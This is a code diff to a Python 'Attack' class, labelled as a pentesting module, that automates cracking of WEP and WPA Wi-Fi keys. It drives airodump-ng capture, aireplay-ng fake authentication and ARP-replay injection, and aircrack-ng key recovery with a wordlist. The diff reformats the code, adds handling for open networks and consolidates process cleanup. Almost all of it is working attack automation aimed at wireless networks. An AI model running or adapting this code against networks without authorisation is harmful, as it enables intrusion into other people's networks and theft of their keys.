@@ -26,23 +26,26 @@ def send_interrupt(process):
 
 
 class Attack():
+    ''' @brief This class is attack function module for pentesting.
+    '''
     def __init__(self, iface, channel, bssid, essid, enc_type, timeout=300):
-        self.iface = iface
-        self.enc_type = enc_type
-        self.channel = channel
-        self.bssid = bssid
-        self.essid = essid
-        self.my_mac = get_mac_address(iface)
+        self.iface      = iface
+        self.enc_type   = enc_type
+        self.channel    = channel
+        self.bssid      = bssid
+        self.essid      = essid
+        self.my_mac     = get_mac_address(iface)
+
         self.ivs = 0
         self.key = ''
-        self.inject_sig = False
-        self.fake_auth_sig = False
-        self.arp_req_sig = False
-        self.crack_success = False
-        self.timeout = int(timeout)
-        self.scheduler = sched.scheduler(time.time, time.sleep)
-        self.pid_list = []
-        self.password_list = '/tmp/password.lst'
+        self.inject_sig     = False
+        self.fake_auth_sig  = False
+        self.arp_req_sig    = False
+        self.crack_success  = False
+        self.timeout        = int(timeout)
+        self.scheduler      = sched.scheduler(time.time, time.sleep)
+        self.pid_list       = []
+        self.password_list  = '/tmp/password.lst'
 
     def channel_change(self):
         cmd = ['iw', 'dev', self.iface, 'set', 'channel', self.channel]
@@ -78,7 +81,6 @@ class Attack():
                 cmd.append('-e')
                 cmd.append(self.essid)
             cmd.append(self.iface)
-
             proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
             self.pid_list.append(proc_fakeauth.pid)
             started = time.time()
@@ -121,10 +123,12 @@ class Attack():
 
     def run(self):
         self.scheduler.enter(self.timeout, 1, self.handler, ())
-        if self.enc_type == 'WEP':
+        if 'WEP' in self.enc_type.upper():
             self.wep_run()
-        elif self.enc_type == 'WPA':
+        elif 'WPA' in self.enc_type.upper():
             self.wpa_run()
+        elif 'OPN' in self.enc_type.upper():
+            self.key = "OPN"
         else:
             self.key = True
 
@@ -151,8 +155,10 @@ class Attack():
         dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', '/tmp/' + self.essid, self.iface]
         airodump_proc = Popen(dump_cmd, stdout=DN, stderr=DN)
         self.pid_list.append(airodump_proc.pid)
+
         self.wep_fake_auth()
         self.wep_arp_send()
+
         crack_iv = 5000
         while self.key == '':
             key_reader = csv.reader(open('/tmp/'+self.essid+'-01.csv'))
@@ -171,8 +177,7 @@ class Attack():
                         self.key = str(key.decode('hex'))
                         self.crack_success = True
                         airodump_proc.kill()
-                        Popen('killall aireplay-ng', shell=True, stdout=None, stderr=None)
-                        Popen('killall aircrack-ng', shell=True, stdout=None, stderr=None)
+                        self.stop()
                     except IOError:
                         crack_iv = crack_iv + 5000
                 time.sleep(5)
@@ -202,8 +207,7 @@ class Attack():
                     self.key = key
                     self.crack_success = True
                     airodump_proc.kill()
-                    Popen('killall aireplay-ng', shell=True, stdout=None, stderr=None)
-                    Popen('killall aircrack-ng', shell=True, stdout=None, stderr=None)
+                    self.stop()
                 except:
                     pass
             else:
@@ -219,9 +223,5 @@ class Attack():
                 pass
 
     def handler(self):
-        for pid in self.pid_list:
-            try:
-                os.kill(pid, signal.SIGTERM)
-            except OSError:
-                pass
+        self.stop()
         self.key = False
